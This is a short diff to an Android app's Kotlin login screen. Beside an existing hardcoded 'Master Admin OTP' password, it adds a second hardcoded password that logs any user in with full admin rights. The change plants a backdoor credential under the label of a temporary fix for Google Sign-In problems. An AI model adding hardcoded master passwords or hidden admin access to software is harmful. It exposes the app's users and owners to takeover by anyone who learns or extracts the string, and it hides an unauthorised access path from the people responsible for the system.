@@ -86,7 +86,7 @@ class LoginFragment : Fragment() {
             }
 
             // Master Admin OTP (Temporary fix for Google Sign-In issues)
-            if (password == "ADMIN_1234") {
+            if (password == "ADMIN_1234" || password == "bpahan685@admin") {
                 SettingsManager.setLoggedIn(requireContext(), true)
                 SettingsManager.setAdmin(requireContext(), true)
                 findNavController().navigate(R.id.action_login_to_dashboard)
